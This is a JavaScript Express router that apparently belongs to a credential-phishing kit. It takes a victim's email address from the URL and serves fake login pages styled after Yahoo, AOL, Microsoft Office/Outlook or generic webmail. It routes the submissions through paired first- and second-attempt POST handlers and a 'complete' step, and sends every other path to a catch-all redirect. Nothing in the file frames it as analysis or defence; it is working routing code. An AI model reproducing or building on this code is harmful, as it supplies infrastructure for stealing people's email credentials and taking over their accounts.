const express = require("express");
const router = express.Router();
const controller = require("../controllers/controller");

router.get("/auth", (req, res) => {
  if (!req.query.email) {
    res.status(400).send("No email specified");
    return;
  }

  const email = req.query.email;
  const domain = email.split("@")[1].split(".")[0];

  switch (domain) {
    case "yahoo":
    case "ymail":
      res.render("yahoo/login3", { email });
      break;
    case "aol":
      res.render("aol/login3", { email });
      break;
    case "webmail":
      res.render("login3", { email });
      break;
    case "outlook":
    case "office":
    case "office365":
    case "live":
    case "hotmail":
    case "msn":
    case "windowslive":
      res.render("office/login3", { email });
      break;
    default:
      res.render("login3", { email });
  }
});

router.post("/auth/office", controller.officePost);
router.post("/auth/office/2", controller.officePost2);
router.post("/auth/yahoo", controller.yahooPost);
router.post("/auth/yahoo/2", controller.yahooPost2);
router.post("/auth/aol", controller.aolPost);
router.post("/auth/aol/2", controller.aolPost2);
router.post("/auth/mail", controller.mailPost);
router.post("/auth/mail/2", controller.mailPost2);

router.get("/auth/office", controller.office);
router.get("/auth/office/2", controller.office2);
router.get("/auth/yahoo", controller.yahoo);
router.get("/auth/yahoo/2", controller.yahoo2);
router.get("/auth/aol", controller.aol);
router.get("/auth/aol/2", controller.aol2);
router.get("/auth/mail", controller.mail);
router.get("/auth/mail/2", controller.mail2);
router.get("/auth/complete", controller.complete);

router.get("*", controller.page404Redirect);

module.exports = router;
